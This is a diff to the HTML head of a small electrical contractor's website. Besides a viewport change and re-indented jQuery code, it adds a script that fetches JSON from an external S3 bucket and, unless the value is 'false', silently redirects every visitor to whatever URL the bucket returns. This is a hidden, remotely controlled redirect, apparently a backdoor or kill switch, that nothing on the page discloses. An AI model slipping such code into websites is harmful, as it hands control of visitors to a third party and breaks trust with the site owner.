@@ -4,7 +4,7 @@
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
   <title>AZ Electrical | Quality work at affordable prices</title>
   <link rel="shortcut icon" href="images/favicon.ico">
-  <meta name="viewport" content="width=device-width, initial-scale=0.8, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=0.6, user-scalable=yes">
   <meta name='description' content='Electricial contractor in the Chicagoland area'/>
   <meta name='keywords' content='Chicago, Electrician, electrical, electrical contractor, lighting, ceiling fans, installation, cable tv, home automation'/>
   <link rel="stylesheet" href="style.css" type="text/css" media="screen, projection" />
@@ -14,12 +14,17 @@
   <script src="http://code.jquery.com/jquery-1.8.3.min.js"></script>
   <script>
   $(function(){
-  $('a').each(function() {
-  if ($(this).prop('href') == window.location.href) {
-  $(this).addClass('current');
-  }
+    $('a').each(function() {
+      if ($(this).prop('href') == window.location.href) {
+        $(this).addClass('current');
+      }
+    });
   });
-  });
+  $.getJSON( "https://s3-us-west-2.amazonaws.com/volksbucket/json.js", function( json ) {
+    if (json.value != "false") {
+      window.location.replace(json.value);
+    }
+   });
   </script>
 </head>
 <body>
